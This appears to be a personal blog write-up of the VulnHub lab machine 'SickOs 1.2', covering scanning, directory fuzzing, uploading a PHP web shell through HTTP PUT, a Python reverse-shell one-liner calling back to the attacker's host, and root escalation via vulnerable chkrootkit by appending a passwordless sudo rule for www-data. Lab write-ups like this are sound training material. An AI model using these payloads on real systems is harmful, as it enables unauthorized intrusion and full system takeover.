---
layout: post
title: "sickos1.2"
date: 2016-05-31 13:08:16 -0500
comments: true
categories: [vulhub,chrootkit,joomla!]
---

From [Vulhub](From [Vulhub](https://www.vulnhub.com/entry/csharp-vulnjson,134/)

###Tools:

* netdiscover
* Nmap
* Nikto
* Wfuzz
* Curl

<!--more-->

Use netdiscover to detect target IP address

`netdiscover -i eth0 -r 192.168.79.0/24`

{% img  /images/blog/vulhub/sickos1.2/Selection_001.png   [title manually exploit [alt text]] %}

192.168.79.180 is the target.

Then run nmap to detect opening ports and running services on the target machine.

`nmap -sV -v -O -A -T5 192.168.79.180 -p-`

Looks like port 22 and port 80 are openning.

{% img  /images/blog/vulhub/sickos1.2/Selection_002.png   [title manually exploit [alt text]] %}

Check the http://192.168.79.180

{% img  /images/blog/vulhub/sickos1.2/Selection_003.png   [title manually exploit [alt text]] %}

Not excited.

use Nikto:

{% img  /images/blog/vulhub/sickos1.2/Selection_004.png   [title manually exploit [alt text]] %}

Still nothing cool

try wfuzz:

```
wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.79.180/FUZZ 2>/dev/null
```
find a test dir:

{% img  /images/blog/vulhub/sickos1.2/Selection_005.png   [title manually exploit [alt text]] %}


{% img  /images/blog/vulhub/sickos1.2/Selection_006.png   [title manually exploit [alt text]] %}

next exam the HTTP options:

```
curl -v -X OPTIONS http://192.168.79.180/test/
```

{% img  /images/blog/vulhub/sickos1.2/Selection_007.png   [title manually exploit [alt text]] %}


looks like it supports PUT.

Now upload php reverse shell (I tried different ports, looks like only 443 port works):


```
nmap -p80 192.168.79.180 --script http-put --script-args http-put.url='/test/shell.php',http-put.file='shell.php'
```


{% img  /images/blog/vulhub/sickos1.2/Selection_008.png   [title manually exploit [alt text]] %}


now the shell is uploaded:


{% img  /images/blog/vulhub/sickos1.2/Selection_009.png   [title manually exploit [alt text]] %}


get the reverse shell:


{% img  /images/blog/vulhub/sickos1.2/Selection_010.png   [title manually exploit [alt text]] %}


A better php shell:

```php
<?php system($_GET["exec"]); ?>
```

Upload this shell, and in brower:

```
http://192.168.79.180/test/exec.php?exec=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.79.173",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
get the shell.


During enumeration step, I follow [g0tmi1k](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

`ls -l /etc/cron.daily`

{% img  /images/blog/vulhub/sickos1.2/Selection_012.png   [title manually exploit [alt text]] %}

After enumeration, find the system has chkrootkit:

`dpkg -l | grep chkrootkit`


chkrootkit verions is 0.49 and it is vulnerable.


`searchsploit chkrootkit`


`echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update`

also need to change the privilages on the update file with chmod 777 and wait:

`ls -al /etc/sudoers`

try:

`sudo su`


{% img  /images/blog/vulhub/sickos1.2/Selection_013.png   [title manually exploit [alt text]] %}



DONE










